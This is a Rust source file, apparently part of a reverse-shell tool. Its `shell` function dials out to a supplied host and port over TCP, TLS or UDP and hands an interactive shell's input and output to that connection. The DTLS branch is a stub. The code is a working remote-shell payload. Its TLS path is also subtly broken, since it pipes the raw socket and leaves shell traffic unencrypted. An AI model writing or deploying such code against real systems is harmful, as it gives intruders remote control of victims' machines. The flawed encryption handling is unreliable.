use std::io::Result;
use std::net::{TcpStream, UdpSocket, SocketAddr};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
use crate::input::Protocol;

pub fn shell(host: String, port: String, shell: String, proto: Protocol) -> Result<()> {
    match proto {
        Protocol::Tcp => {
            let sock = TcpStream::connect(format!("{}:{}", host, port))?;
            let fd = sock.as_raw_fd();
            Command::new(shell)
                .arg("-i")
                .stdin(unsafe { Stdio::from_raw_fd(fd) })
                .stdout(unsafe { Stdio::from_raw_fd(fd) })
                .stderr(unsafe { Stdio::from_raw_fd(fd) })
                .spawn()?
                .wait()?;
        }
        Protocol::Tls => {
            use std::sync::Arc;
            use rustls::{ClientConfig};
            use webpki_roots::TLS_SERVER_ROOTS;
            use crate::listener::tls::connect_tls;

            let mut root_store = rustls::RootCertStore::empty();
            root_store.extend(TLS_SERVER_ROOTS.iter().cloned());
            let config = ClientConfig::builder()
                .with_root_certificates(root_store)
                .with_no_client_auth();
            let config = Arc::new(config);
            let stream = TcpStream::connect(format!("{}:{}", host, port))?;
            let tls_stream = connect_tls(stream, config, &host)?;
            // Use the TLS stream as a pipe for the shell
            let fd = tls_stream.get_ref().as_raw_fd();
            Command::new(shell)
                .arg("-i")
                .stdin(unsafe { Stdio::from_raw_fd(fd) })
                .stdout(unsafe { Stdio::from_raw_fd(fd) })
                .stderr(unsafe { Stdio::from_raw_fd(fd) })
                .spawn()?
                .wait()?;
        }
        Protocol::Udp => {
            let sock = UdpSocket::bind("0.0.0.0:0")?;
            let addr: SocketAddr = format!("{}:{}", host, port).parse().unwrap();
            sock.connect(addr)?;
            // Use UDP socket as a pipe (not secure, just for demonstration)
            let fd = sock.as_raw_fd();
            Command::new(shell)
                .arg("-i")
                .stdin(unsafe { Stdio::from_raw_fd(fd) })
                .stdout(unsafe { Stdio::from_raw_fd(fd) })
                .stderr(unsafe { Stdio::from_raw_fd(fd) })
                .spawn()?
                .wait()?;
        }
        Protocol::Dtls => {
            use udp_dtls::{Identity, Certificate};
            use crate::listener::tls::connect_dtls;
            let sock = UdpSocket::bind("0.0.0.0:0")?;
            let addr: SocketAddr = format!("{}:{}", host, port).parse().unwrap();
            // For demo: use dummy identity/cert (replace with real certs in production)
            let identity = Identity::from_pkcs12(&[], "").unwrap_or_else(|_| panic!("Provide DTLS identity"));
            let peer_cert = Certificate::from_der(&[]).unwrap_or_else(|_| panic!("Provide DTLS peer cert"));
            let dtls_stream = connect_dtls(sock, addr, identity, peer_cert)?;
            // Use DTLS stream as a pipe for the shell (not production ready)
            // This is a placeholder: you would need to implement a custom Read/Write adapter for the shell
            // For now, just print a message
            eprintln!("DTLS shell not fully implemented. You must implement a custom adapter for stdio <-> dtls_stream");
        }
    }
    log::warn!("Shell exited");
    Ok(())
}
